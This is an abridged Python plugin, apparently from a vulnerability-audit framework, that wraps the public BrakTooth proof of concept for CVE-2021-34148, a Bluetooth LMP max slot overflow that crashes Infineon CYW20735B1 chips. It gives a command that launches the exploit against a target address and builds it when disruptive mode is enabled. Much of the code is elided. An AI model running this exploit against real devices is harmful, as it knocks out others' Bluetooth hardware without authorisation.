#!/usr/bin/env python3
"""CVE-2021-34148 – BrakTooth BT Classic: LMP Max Slot Overflow – Infineon CYW20735B1 max slot overflow.

Public PoC source: https://github.com/Matheus-Garbelini/braktooth_esp32_bluetooth_classic_attacks
  Attack module: lmp_max_slot_overflow
...
Usage:
  Load exploit module "lmp_max_slot_overflow" via WDissector:
    sudo ./wdissector --exploit=lmp_max_slot_overflow --target=<bdaddr>
"""
...
VULN = {
    ...
    "summary": "LMP Max Slot Overflow – Infineon CYW20735B1 max slot overflow",
...
def _run_poc(plugin):
    ...
    evidence = {
        "cve": "CVE-2021-34148",
        "braktooth_module": "lmp_max_slot_overflow",
        ...
        "attack_surface": "Infineon CYW20735B1 BT SoC LMP max slot overflow → crash",
    }
    ...
    if allow_disruptive and target:
        ...
        cmd[1] = f"--exploit=lmp_max_slot_overflow"
    ...
    return {
        ...
        "evidence": evidence,
        "requires_manual_review": True,
        "poc_source": "Matheus-Garbelini/braktooth / module: lmp_max_slot_overflow",
    }


_module = "lmp_max_slot_overflow"  # exploit module name
try:
...
class Poc116CVE202134148BrakToothBtClassicAuditPlugin(IVIVulnerabilityPlugin):
    meta_generated_source = "public_poc_exp_50_more"
    meta_display_id = "POC-WIRELESS-116"
    meta_poc_name   = 'CVE-2021-34148 BrakTooth CYW20735B1 Max Slot Overflow Active Validation'
    meta_cve_id     = "CVE-2021-34148"
    meta_severity   = "High"
    ...
    meta_attack_surface = "Infineon CYW20735B1 BT SoC LMP max slot overflow → crash"
    is_disruptive   = True
...
if __name__ == "__main__":
    ...
    _desc = VULN.get("summary", "116_LMP_Max_Slot_Overflow__Infineon_CYW2073_Audit") if "VULN" in dir() else "116_LMP_Max_Slot_Overflow__Infineon_CYW2073_Audit"
    ...
    _plugin = Poc116CVE202134148BrakToothBtClassicAuditPlugin({
